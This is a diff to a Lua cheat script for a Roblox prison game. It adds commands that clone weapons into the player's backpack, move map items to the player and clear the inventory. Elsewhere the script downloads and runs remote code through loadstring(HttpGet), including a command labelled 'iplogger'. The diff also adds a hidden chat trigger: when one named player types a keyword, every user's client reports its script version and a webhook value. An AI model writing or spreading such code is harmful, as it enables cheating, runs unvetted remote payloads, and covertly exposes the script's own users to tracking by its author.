@@ -420,7 +420,7 @@ Cmd[#Cmd + 1] = {Text = "script mejorado por hell#3224",Title = "My Discord"}
 Cmd[#Cmd + 1] = {Text = "JezkoDev",Title = "Tu papi :)"}
 Cmd[#Cmd + 1] = {Text = "Click?",Title = "Click on cmd to use quick cmd"}
 Cmd[#Cmd + 1] = {Text = "*Note*",Title = "New updates: Reduce lag & faster bring and more commands"}
-Cmd[#Cmd + 1] = {Text = "god2",Title = "Old God Mode"}
+Cmd[#Cmd + 1] = {Text = "god2",Title = "Buggy"}
 Cmd[#Cmd + 1] = {Text = "loopbring",Title = "loopbring gui"}
 Cmd[#Cmd + 1] = {Text = "ff",Title = "fuck gui"}
 Cmd[#Cmd + 1] =	{Text = "rejoin / rj",Title = "Rejoin the game"}
@@ -492,7 +492,6 @@ Cmd[#Cmd + 1] = {Text = "antifling",Title = "Activate anti fling"}
 Cmd[#Cmd + 1] = {Text = "unantifling",Title = "Unactivate anti fling"}
 Cmd[#Cmd + 1] = {Text = "god",Title = "Become a god mode"}
 Cmd[#Cmd + 1] = {Text = "ungod",Title = "Unbecome a god mode"}
-Cmd[#Cmd + 1] = {Text = "ungod2 / re3",Title = "Turns off godmode2"}
 Cmd[#Cmd + 1] =	{Text = "view / spectate / watch [plr]",Title = "Spectates the player"}
 Cmd[#Cmd + 1] =	{Text = "unview / unspectate / stopwatch",Title = "Unspectates the player"}
 Cmd[#Cmd + 1] =	{Text = "fastpunch / speedpunchh",Title = "Activate fast punch"}
@@ -578,8 +577,10 @@ Cmd[#Cmd + 1] =	{Text = "notify",Title = "Send a message when player leave / joi
 Cmd[#Cmd + 1] =	{Text = "nonotify",Title = "Stop send a message when player leave / join"}
 Cmd[#Cmd + 1] =	{Text = "copychat",Title = "Copies all players chats"}
 Cmd[#Cmd + 1] =	{Text = "infiniteyield / yield",Title = "Executes Infinite Yield, Aliasses yield"}
+Cmd[#Cmd + 1] =	{Text = "givemelee / melee",Title = "Gives tools"}
+Cmd[#Cmd + 1] =	{Text = "clearinv / invc",Title = "Clear Inventory"}
+Cmd[#Cmd + 1] =	{Text = "spawntools / sptools",Title = "Spawn Tools"}
 Cmd[#Cmd + 1] =	{Text = "opengui / open",Title = "Opens the GUI, open"}
-Cmd[#Cmd + 1] =	{Text = "antiafk / afk",Title = "Loads antiafk"}
 Cmd[#Cmd + 1] =	{Text = "?copyt",Title = "Copy player team color"}
 Cmd[#Cmd + 1] =	{Text = "closegui / close",Title = "Closes the GUI, close"}
 Cmd[#Cmd + 1] =	{Text = "uncopychat",Title = "uncopies all players chats"}
@@ -1792,6 +1793,29 @@ end
 		Notify("Infinite Yield Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
 	end
+	if Command("clearinv") or Command("invc") then
+		Notify("Inventory Clear Sucess", Color3.fromRGB(0, 255 ,0), "Success")
+	          for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+            v:Destroy()
+        end
+	end
+	if Command("spawntools") or Command("sptools") then
+		Notify("Spawned Tools", Color3.fromRGB(0, 255 ,0), "Success")
+	          for i, v in pairs(game.Workspace["Prison_ITEMS"].single:GetChildren()) do
+             v:MoveTo(game.Players.LocalPlayer.Character.Torso.Position)
+        end
+	end
+	if Command("givemelee") or Command("melee") then
+		Notify("Melee Given To Your Backpack", Color3.fromRGB(0, 255 ,0), "Success")
+	    local weapons = {"Crude Knife", "Sharpened stick", "Extendo mirror"}
+             for i, v in pairs(game.ReplicatedStorage.Tools:GetChildren()) do
+              for j, k in pairs(weapons) do
+              if v.Name == k then
+              v:Clone().Parent = game.Players.LocalPlayer.Backpack
+              end
+            end
+        end
+	end
 	if Command("spookyware") or Command("reanim1") then
 		Notify("SpookyWare Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/SpookyWare'),true))()
@@ -1799,16 +1823,6 @@ end
 	if Command("iplogger") or Command("iplog") then
 		Notify("IpLogger Loaded", Color3.fromRGB(0, 255 ,0), "Success")
 	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/IpLogger'),true))()
-	end
-	if Command("antiafk") or Command("afk") then
-		Notify("Anti Afk Loaded", Color3.fromRGB(0, 255 ,0), "Success")
-	    local VirtualUser=game:service'VirtualUser'
-        game:service'Players'.LocalPlayer.Idled:connect(function()
-        VirtualUser:CaptureController()
-        VirtualUser:ClickButton2(Vector2.new())
-        end)
-        
-        warn("Anti-Afk has Loaded")
 	end
 	if Command("flinggui") or Command("fgui") then
 		Notify("Fling GUI Loaded", Color3.fromRGB(0, 255 ,0), "Success")
@@ -4583,6 +4597,19 @@ FindCmd.Changed:Connect(function()
 		end
 	end
 end)
+
+--CheckFor
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local player = game.Players.LocalPlayer
+        if msg == "?checkfor ." then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Using Commands Version:'.. Versions ..' Whit *'.. webhookcheck ..'*  ', 'All')
+        end
+    end
+  end)
+end
 
 game.Players.PlayerAdded:Connect(function()
 	for i,v in pairs(game.Players:GetPlayers()) do
